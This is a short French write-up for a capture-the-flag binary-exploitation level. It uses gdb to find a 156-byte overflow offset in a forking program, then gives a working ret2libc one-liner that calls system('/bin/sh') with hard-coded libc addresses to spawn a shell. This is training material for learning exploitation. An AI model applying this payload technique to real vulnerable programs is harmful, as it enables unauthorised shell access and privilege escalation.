Level 4

On voit que le program fait un fork et va checker avec ptrace si nous n'executons pas de exec().
On voit que le fgets() prend 156 caractere et que si l'on depasse ca fait boucler le processus fils en boucle inf.

Nous allons donc determiner le nbr de caractere pour faire overflow grace a un pattern overflow generator.

1er probleme il faut reussir a suivre les informations dans le processus fils : 
```
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
[New process 2088]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2088]
0x41326641 in ?? ()
```
l'overflow est au 156eme caractere.

Il faut donc lancer un shellcode sans exce()
On peut simplement appeler system "/bin/sh"

Pour trouver l'addresse de "/bin/sh" grace a gdb :
```find &system, +999999999, "/bin/sh"```
Pour trouver l'addresse de system grace a gdb :
```print &system```

Attention, system prend 4 octets random pour son addresse de retour 
```
(python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + '0000' + '\xec\x97\xf8\xf7' " ; cat -) | ./level04
```